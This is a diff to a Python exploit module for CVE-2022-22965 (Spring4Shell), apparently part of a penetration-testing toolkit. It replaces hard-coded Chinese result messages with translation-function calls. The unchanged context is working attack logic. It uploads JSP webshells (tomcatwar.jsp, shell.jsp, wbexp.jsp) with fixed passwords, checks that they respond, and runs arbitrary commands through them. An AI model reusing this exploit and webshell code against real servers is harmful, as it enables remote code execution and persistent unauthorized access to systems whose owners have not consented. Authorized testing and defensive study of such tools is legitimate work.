@@ -6,6 +6,7 @@ import urllib3
 
 from util import RandomUA
 from util import JsonMethod
+from util.Translate import tr
 class CVE_2022_22965:
     def __init__(self):
         ua = RandomUA.RandomUA()
@@ -78,13 +79,13 @@ class CVE_2022_22965:
 
             test = requests.get(url + "tomcatwar.jsp", verify=False, proxies=proxies)
             if (test.status_code == 200) and ('aabysszg' in str(test.text)):
-                result = f'[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：{url}tomcatwar.jsp?pwd=aabysszg&cmd=whoami'
+                result = tr("v.22965.shell_aabyss", url=url)
                 return result
             else:
-                result = f'[-] {url} CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：[/tomcatwar.jsp?pwd=aabysszg&cmd=命令]'
+                result = tr("v.22965.shell_manual", url=url)
                 return result
         except Exception as e:
-            error = f"[error] {url} 未知错误 {e}"
+            error = tr("v.unknown", url=url, e=e)
             return error
     def poc2(self,url,proxies,ProxyStute):
 
@@ -120,10 +121,10 @@ class CVE_2022_22965:
                 result2 = f"[+]Wirte Shell Response Code: {ret.status_code}\n"
                 if ret.status_code == 200:
                     if self.expType == "default":
-                        result3 = f"[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：{url}shell.jsp?cmd=whoami"
+                        result3 = tr("v.22965.shell_default", url=url)
                         return result1 + result2 + result3
                     elif self.expType == "13EXP":
-                        result4 = f"[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：{url}wbexp.jsp?pwd=13exp&cmd=whoami"
+                        result4 = tr("v.22965.shell_13exp", url=url)
                         return result1 + result2 + result4
                     else:
                         return "error"
@@ -131,10 +132,10 @@ class CVE_2022_22965:
                     result = f"[-]Wirte Shell Response Error: {ret.status_code}"
                     return result
             else:
-                result = f"[-] {url} CVE-2022-22965漏洞不存在或者已经被利用,shell地址自行扫描"
+                result = tr("v.22965.shell_scan", url=url)
                 return result
         except Exception as e:
-            error = f"[error] {url} 未知错误 {e}"
+            error = tr("v.unknown", url=url, e=e)
             return error
     def exp(self, url, proxies, ProxyStute,cmd):
         self.expTypeGet = self.configRead.VulnsConfigRead()
@@ -158,13 +159,13 @@ class CVE_2022_22965:
             resp = r.text.strip("\n")
             return resp
         except urllib3.util.ssl_match_hostname.CertificateError:
-            result = "[-] CVE_2022_22965命令执行 请求错误"
+            result = tr("v.22965.cmd_req_err")
         except urllib3.exceptions.MaxRetryError:
-            result = "[-] CVE_2022_22965命令执行 请求错误"
+            result = tr("v.22965.cmd_req_err")
         except requests.exceptions.SSLError:
-            result = "[-] CVE_2022_22965命令执行 请求错误"
+            result = tr("v.22965.cmd_req_err")
         except:
-            result = "[-] CVE_2022_22965命令执行 未知错误"
+            result = tr("v.22965.cmd_unknown")
         return  result
 if __name__ == "__main__":
     poc = CVE_2022_22965()
